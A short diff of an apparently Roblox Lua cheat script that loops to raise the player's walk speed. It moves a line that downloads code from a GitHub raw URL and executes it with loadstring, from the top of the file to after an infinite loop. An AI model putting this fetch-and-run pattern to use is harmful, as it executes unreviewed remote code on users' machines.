@@ -1,5 +1,4 @@
 ---- Made by 1dl5 ----
-loadstring(game:HttpGet("https://raw.githubusercontent.com/TackierHawk/AddPoints/main/Points", true))()
 local water = game.Workspace:GetChildren()
 local plr = game.Players.LocalPlayer
 local char = plr.Character
@@ -16,3 +15,4 @@ while true do
 	wait(1)
 	char.LocalHumanoid.WalkSpeed = 24
 end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TackierHawk/AddPoints/main/Points", true))()
